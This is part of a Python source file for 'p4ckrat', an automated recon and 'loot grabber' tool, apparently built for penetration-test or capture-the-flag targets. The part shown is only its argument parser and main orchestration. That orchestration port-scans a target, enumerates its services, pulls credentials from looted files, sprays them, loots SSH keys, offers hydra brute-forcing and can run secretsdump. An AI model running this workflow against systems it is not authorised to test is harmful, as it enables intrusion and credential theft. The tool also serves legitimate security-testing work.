    p = argparse.ArgumentParser(
        prog="p4ckrat", add_help=True,
        description="full-auto recon & loot grabber (by p4cket)")
    p.add_argument("ip", help="target IP")
    p.add_argument("-d","--domain", default="", help="force the AD domain (else auto)")
    p.add_argument("-o","--outdir", default="", help="output dir (default: p4ckrat/<ip>/)")
    p.add_argument("--udp", action="store_true", help="also run a parallel UDP top-20 scan")
    p.add_argument("--nuclei", action="store_true", help="run nuclei on web ports")
    p.add_argument("--crawl", action="store_true", help="crawl web ports with katana/gau")
    p.add_argument("--secretsdump", action="store_true", help="run secretsdump on SMB admin")
    p.add_argument("--no-gobuster", action="store_true", help="skip gobuster (no prompt)")
    p.add_argument("--no-spray", action="store_true", help="disable credential-spray / pivot phase")
    g = p.add_mutually_exclusive_group()
    g.add_argument("-q","--quiet",   action="store_true", help="findings/warnings/errors only")
    g.add_argument("-v","--verbose", action="store_true", help="show all tool lines + commands")
    p.add_argument("--dry-run", action="store_true",
                   help="only show which commands would run (execute nothing)")
    return p.parse_args(argv)

def main():
    args = parse_args(sys.argv[1:])
    global DOMAIN, DO_UDP, DO_NUCLEI, DO_CRAWL, DO_SECRETS, DO_SPRAY, VERBOSITY, DRY_RUN, DO_GOBUSTER
    if args.domain: DOMAIN = args.domain
    DO_UDP     = args.udp
    DO_NUCLEI  = args.nuclei
    DO_CRAWL   = args.crawl
    DO_SECRETS = args.secretsdump
    DO_SPRAY   = not args.no_spray
    DRY_RUN    = args.dry_run
    VERBOSITY  = 0 if args.quiet else (2 if args.verbose else 1)
    ip = args.ip
    # per-target folder so a new box doesn't overwrite the previous run's findings
    out = Path(args.outdir) if args.outdir else Path("p4ckrat")/re.sub(r"[^A-Za-z0-9._-]+","_",ip)
    out.mkdir(parents=True, exist_ok=True)

    logf  = open(out/"p4ckrat.log", "w", encoding="utf-8")
    findf = open(out/"findings.txt", "w", encoding="utf-8")
    findf.write(f"# p4ckrat findings - {ip} - {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    findf.flush()
    set_logs(logf, findf)

    hb = None
    try:
        banner(ip)
        info(f"live findings  -> {out}/findings.txt", None)
        info(f"full log       -> {out}/p4ckrat.log", None)
        if DRY_RUN: warn("DRY-RUN: nothing is executed, only commands are shown")
        if not have("nmap"): err("nmap missing, abort"); sys.exit(1)
        hb = start_heartbeat()

        svcmap, svc = portscan(ip)
        if not svcmap:
            warn("no open ports, nothing to do"); return
        finding("PORTS", ", ".join(f"{p}/{svcmap[p][0]}" for p in sorted(svcmap, key=int)))
        hosts = all_hostnames(ip, svc)
        host = hosts[0] if hosts else ""
        for h in hosts:
            finding("HOST", h); add_host(ip, h)
        dom = _domain_for(host)
        if dom and dom != host: add_host(ip, dom)   # make the bare AD domain resolve too

        web_ports = [p for p,(n,_) in svcmap.items() if _is_web(p, n)]

        has = lambda port, kw: port in svcmap or any(kw in n for n,_ in svcmap.values())
        if web_ports and not args.no_gobuster:
            DO_GOBUSTER = ask(f"run gobuster (recursive dir fuzz) on port {', '.join(web_ports)}?",
                              default="y")
        else:
            DO_GOBUSTER = False
        if web_ports and not DO_GOBUSTER:
            info("gobuster skipped (index/hints only)")

        head("ENUM (parallel)")
        db_ports = [(p,k) for p,k in (("1433","mssql"),("3306","mysql"),("5432","postgres")) if p in svcmap]
        workers = list(filter(None,[
            "ftp"      if "21" in svcmap else "",
            "smb"      if ("445" in svcmap or "139" in svcmap) else "",
            *[f"web:{p}" for p in web_ports],
            "kerberos" if "88" in svcmap else "",
            "ldap"     if has("389","ldap") or "636" in svcmap or "3268" in svcmap else "",
            "snmp"     if "161" in svcmap else "",
            "nfs"      if ("2049" in svcmap or "111" in svcmap) else "",
            "rpc"      if "135" in svcmap else "",
            "redis"    if "6379" in svcmap else "",
            "rsync"    if "873" in svcmap else "",
            *[k for _,k in db_ports]]))
        info(f"{CONCURRENCY} workers: "+col("w",", ".join(workers)))
        jobs = []
        with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
            if "21" in svcmap: jobs.append(ex.submit(ftp_anon, ip, out))
            if "445" in svcmap or "139" in svcmap: jobs.append(ex.submit(smb_anon, ip, out))
            for wp in web_ports: jobs.append(ex.submit(web, ip, wp, out, host))
            if "88" in svcmap: jobs.append(ex.submit(kerberos, ip, out, host))
            if has("389","ldap") or "636" in svcmap or "3268" in svcmap:
                jobs.append(ex.submit(ldap_enum, ip, out, host))
            if "161" in svcmap: jobs.append(ex.submit(snmp_enum, ip, out))
            if "2049" in svcmap or "111" in svcmap: jobs.append(ex.submit(nfs_enum, ip, out))
            if "135" in svcmap: jobs.append(ex.submit(rpc_enum, ip, out))
            if "6379" in svcmap: jobs.append(ex.submit(redis_enum, ip, out))
            if "873" in svcmap: jobs.append(ex.submit(rsync_enum, ip, out))
            for p,k in db_ports: jobs.append(ex.submit(db_probe, ip, p, k, out))
            for f in as_completed(jobs):
                try: f.result()
                except Exception as e: err(f"phase error: {e!r}")

        head("CREDENTIAL-SCAN")
        info("scanning looted files for credentials...")
        creds = scan_creds(out/"files")
        if creds:
            warn(f"{len(creds)} possible credential hit(s) in files/")
            for h in creds: finding("CREDS", h[:160])
        else:
            info("no credential hits (files/)")

        spray_creds(ip, svcmap, out, host)   # round 1: enum/credscan creds
        ssh_key_loot(ip, out, svcmap, host)
        hydra_prompt(ip, svcmap, out)
        spray_creds(ip, svcmap, out, host)   # round 2: new creds (hydra/secretsdump)
        searchsploit_scan(svcmap)

        head("DONE")
        ok(f"done in {_el()} -> {col('G',str(out))}/")
        info(col("w",f"{out}/findings.txt")+col("d","  (live findings)"))
        info(col("w",f"{out}/p4ckrat.log")+col("d","  (full log)"))
        if (out/"files").exists():
            info(col("w",f"{out}/files/")+col("d","  (loot)"))
        emit()
    finally:
        if hb is not None: hb.set()   # stop heartbeat
        try: logf.close(); findf.close()
        except Exception: pass

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: err("\naborted.")
